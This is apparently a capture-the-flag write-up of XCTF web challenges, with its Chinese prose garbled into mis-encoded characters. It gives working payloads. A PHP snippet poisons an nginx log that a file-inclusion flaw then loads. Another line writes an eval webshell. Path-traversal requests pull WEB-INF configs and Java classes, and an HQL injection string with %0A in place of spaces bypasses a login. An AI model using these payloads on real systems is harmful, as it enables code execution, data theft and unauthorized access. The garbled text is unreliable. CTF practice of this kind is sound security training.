    >ã€æ–‡ä»¶åŒ…å«æ¼æ´ã€‘â€”â€”æ–‡ä»¶åŒ…å«æ¼æ´è¿›é˜¶_æ—¥å¿—æ–‡ä»¶åŒ…å«åˆ©ç”¨_æ–‡ä»¶åŒ…å«æ¼æ´ apacheæ—¥å¿—-CSDNåšå®¢</a></p>
<p>å…ˆåœ¨fileå‚æ•°åé¢åŠ ä¸Š<code>&lt;?php phpinfo();?&gt;&amp;ext=</code>,ç„¶åä»¥ä¸ºæµè§ˆå™¨ä¼šè¿›è¡Œurlè½¬ç ï¼Œæˆ‘ä»¬bpæŠ“åŒ…æ”¹ä¸ºæ²¡è½¬ç å‰çš„å†æ”¾åŒ…</p>
<p>æ¥ç€åœ¨fileåæ‹¼æ¥logçš„è·¯å¾„<code>..././..././..././..././/var/log/nginx/96ee3f7aa86e-access-2025-02-02.log&amp;ext=</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202131629622.png"
	width="1279"
	height="815"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202131629622_hu3182980517794575477.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202131629622_hu3763545552660886198.png 1024w"
	loading="lazy"
	
		alt="image-20250202131629622"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="376px"
	
></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å†™å…¥æœ¨é©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]) ?&gt;&#39;);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŒæ ·çš„æµç¨‹ç„¶åèšå‰‘è¿æ¥</p>
<h2 id="zhuanxv">Zhuanxv
</h2><p>ç›®å½•æ‰«ææ‰«åˆ°/list</p>
<p>ä¸€ä¸ªç™»å…¥ç•Œé¢</p>
<p>æºç ä¸­bodyæœ‰ä¸€ä¸ªurlï¼š./loadimage?fileName=web_login_bg.jpg</p>
<p>æˆ‘ä»¬è®¿é—®çœ‹çœ‹ï¼Œä¼šä¸‹è½½bg.jpg</p>
<p>é€šè¿‡ç½‘é¡µæ’ä»¶æˆ‘ä»¬çŸ¥é“è¿™æ˜¯javaå†™çš„webç•Œé¢</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203124908954.png"
	width="601"
	height="630"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203124908954_hu2345078099726484153.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203124908954_hu7072867273583347220.png 1024w"
	loading="lazy"
	
		alt="image-20250203124908954"
	
	
		class="gallery-image" 
		data-flex-grow="95"
		data-flex-basis="228px"
	
></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•è¯»å–ä¸€ä¸‹é…ç½®æ–‡ä»¶web.xml</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">web</span><span class="o">.</span><span class="n">xml</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸‹è½½å›æ¥æ˜¯å›¾ç‰‡ï¼Œä¸¢åˆ°vscodeæŸ¥çœ‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">id=</span><span class="s">&#34;WebApp_9&#34;</span> <span class="na">version=</span><span class="s">&#34;2.4&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns=</span><span class="s">&#34;http://java.sun.com/xml/ns/j2ee&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;display-name&gt;</span>Struts Blank<span class="nt">&lt;/display-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>struts2<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-class&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="nt">&lt;/filter-class&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>struts2<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/*<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;welcome-file-list&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;welcome-file&gt;</span>/ctfpage/index.jsp<span class="nt">&lt;/welcome-file&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/welcome-file-list&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;error-page&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;error-code&gt;</span>404<span class="nt">&lt;/error-code&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;location&gt;</span>/ctfpage/404.html<span class="nt">&lt;/location&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/error-page&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°ï¼Œç³»ç»Ÿä½¿ç”¨äº†struts2æ¡†æ¶ã€‚</p>
<p>struts.xmlæ˜¯struts2çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­åˆ©ç”¨ç‡æœ€é«˜ã€‚è¯¥æ–‡ä»¶ä¸»è¦è´Ÿè´£ç®¡ç†åº”ç”¨ä¸­çš„Actionæ˜ å°„ï¼Œä»¥åŠè¯¥ActionåŒ…å«çš„Resultå®šä¹‰ç­‰ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬è¯»å–struts.xmlçœ‹çœ‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">struts</span><span class="o">.</span><span class="n">xml</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE struts PUBLIC
</span></span></span><span class="line"><span class="cl"><span class="cp">        &#34;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">        &#34;http://struts.apache.org/dtds/struts-2.3.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;struts&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">&#34;strutsenableDynamicMethodInvocation&#34;</span> <span class="na">value=</span><span class="s">&#34;false&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">&#34;struts.mapper.alwaysSelectFullNamespace&#34;</span> <span class="na">value=</span><span class="s">&#34;true&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">&#34;struts.action.extension&#34;</span> <span class="na">value=</span><span class="s">&#34;,&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;package</span> <span class="na">name=</span><span class="s">&#34;front&#34;</span> <span class="na">namespace=</span><span class="s">&#34;/&#34;</span> <span class="na">extends=</span><span class="s">&#34;struts-default&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;global-exception-mappings&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;exception-mapping</span> <span class="na">exception=</span><span class="s">&#34;java.lang.Exception&#34;</span> <span class="na">result=</span><span class="s">&#34;error&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/global-exception-mappings&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">&#34;zhuanxvlogin&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.action.UserLoginAction&#34;</span> <span class="na">method=</span><span class="s">&#34;execute&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;error&#34;</span><span class="nt">&gt;</span>/ctfpage/login.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;success&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/action&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">&#34;loadimage&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.action.DownloadAction&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;success&#34;</span> <span class="na">type=</span><span class="s">&#34;stream&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;contentType&#34;</span><span class="nt">&gt;</span>image/jpeg<span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;contentDisposition&#34;</span><span class="nt">&gt;</span>attachment;filename=&#34;bg.jpg&#34;<span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;inputName&#34;</span><span class="nt">&gt;</span>downloadFile<span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;suffix_error&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/action&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/package&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;package</span> <span class="na">name=</span><span class="s">&#34;back&#34;</span> <span class="na">namespace=</span><span class="s">&#34;/&#34;</span> <span class="na">extends=</span><span class="s">&#34;struts-default&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;interceptors&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;interceptor</span> <span class="na">name=</span><span class="s">&#34;oa&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.util.UserOAuth&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;interceptor-stack</span> <span class="na">name=</span><span class="s">&#34;userAuth&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;interceptor-ref</span> <span class="na">name=</span><span class="s">&#34;defaultStack&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;interceptor-ref</span> <span class="na">name=</span><span class="s">&#34;oa&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/interceptor-stack&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/interceptors&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">&#34;list&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.action.AdminAction&#34;</span> <span class="na">method=</span><span class="s">&#34;execute&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;interceptor-ref</span> <span class="na">name=</span><span class="s">&#34;userAuth&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;excludeMethods&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                    execute
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/interceptor-ref&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;login_error&#34;</span><span class="nt">&gt;</span>/ctfpage/login.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;list_error&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;success&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/action&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/package&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/struts&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œclassé‡Œé¢å¯ä»¥çœ‹åˆ°å¾ˆå¤šclassç±»åï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œéƒ½å¯ä»¥é€ä¸ªä¸‹è½½ï¼Œç‚¹å·æ¢æˆæ­£æ–œæ ï¼Œç„¶åå†åœ¨åé¢åŠ ä¸ª.classå°±å¯ä»¥ä¸‹è½½äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">action</span><span class="o">/</span><span class="n">UserLoginAction</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">action</span><span class="o">/</span><span class="n">DownloadAction</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">util</span><span class="o">/</span><span class="n">UserOAuth</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">action</span><span class="o">/</span><span class="n">AdminAction</span><span class="o">.</span><span class="k">class</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±äºä¸‹è½½ä¸‹æ¥çš„classæ–‡ä»¶æ— æ³•æ­£å¸¸é˜…è¯»ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶åç¼–è¯‘æˆjavaæºä»£ç ã€‚</p>
<p>æ‰“å¼€jd-guiå·¥å…·ï¼Œå°†classæ–‡ä»¶ç›´æ¥æ‹–è¿›å»å³å¯ã€‚</p>
<p>UserLoginAction.classè¿™é‡Œå¼•ç”¨äº†å…¶ä»–ä¸‰ä¸ªç±»ï¼Œæˆ‘ä»¬ä¸‹è½½æ¥çœ‹çœ‹</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203130619285.png"
	width="804"
	height="81"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203130619285_hu16881783634455472458.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203130619285_hu9260693623456118297.png 1024w"
	loading="lazy"
	
		alt="image-20250203130619285"
	
	
		class="gallery-image" 
		data-flex-grow="992"
		data-flex-basis="2382px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">po</span><span class="o">/</span><span class="n">User</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">service</span><span class="o">/</span><span class="n">UserService</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">util</span><span class="o">/</span><span class="n">InitApplicationContext</span><span class="o">.</span><span class="k">class</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203131015392.png"
	width="902"
	height="282"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203131015392_hu3035784747572846490.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203131015392_hu15654764521026177406.png 1024w"
	loading="lazy"
	
		alt="image-20250203131015392"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="767px"
	
></p>
<p>æ‰¾åˆ°ä¸€ä¸ªxmlï¼Œä¸‹è½½</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">applicationContext</span><span class="o">.</span><span class="n">xml</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå‘ç°user.hbm.xmlå’Œä¸¤ä¸ªç±»</p>
<p>ç»§ç»­ä¸‹è½½</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">hbm</span><span class="o">.</span><span class="n">xml</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">service</span><span class="o">/</span><span class="n">impl</span><span class="o">/</span><span class="n">UserServiceImpl</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">dao</span><span class="o">/</span><span class="n">impl</span><span class="o">/</span><span class="n">UserDaoImpl</span><span class="o">.</span><span class="k">class</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133339228.png"
	width="986"
	height="689"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133339228_hu2593498161675548169.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203133339228_hu15764969095108590979.png 1024w"
	loading="lazy"
	
		alt="image-20250203133339228"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="343px"
	
></p>
<p>è¿™é‡Œè¿‡æ»¤äº†ç”¨æˆ·åçš„ç©ºæ ¼å’Œç­‰å·</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133551988.png"
	width="905"
	height="364"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133551988_hu8841099236303492315.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203133551988_hu12366564774236186266.png 1024w"
	loading="lazy"
	
		alt="image-20250203133551988"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="596px"
	
></p>
<p>è¿™é‡Œæœ‰HQLæŸ¥è¯¢è¯­å¥</p>
<p>æ„é€ ä¸‡èƒ½å¯†ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">&gt;</span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#34; + password + &#34;&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºä¸Šé¢è¿‡æ»¤ç©ºæ ¼ï¼Œæˆ‘ä»¬ç”¨%09æˆ–è€…%0Aä»£æ›¿</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ç”¨æˆ·åï¼šadmin&#39;%0Aor%0A&#39;1&#39;&gt;&#39;0&#39;%0Aor%0Aname%0Alike%0A&#39;admin
</span></span><span class="line"><span class="cl">å¯†ç ï¼š123ï¼ˆéšæ„ï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”¨hackbargetä¼ å‚</p>
<p>å› ä¸ºæŠ“åŒ…çš„å‚æ•°æ˜¯è¿™æ ·</p>
<p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250203134314242.png"
	
	
	
	loading="lazy"
	
		alt="image-20250203134314242"
	
	
></p>
<p>æ‰€ä»¥æˆ‘ä»¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?user.name=admin&#39;%0Aor%0A&#39;1&#39;&gt;&#39;0&#39;%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203134515527.png"
	width="1678"
	height="640"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203134515527_hu17977927402897636177.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203134515527_hu311653241147089224.png 1024w"
	loading="lazy"
	
		alt="image-20250203134515527"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="629px"
	
></p>
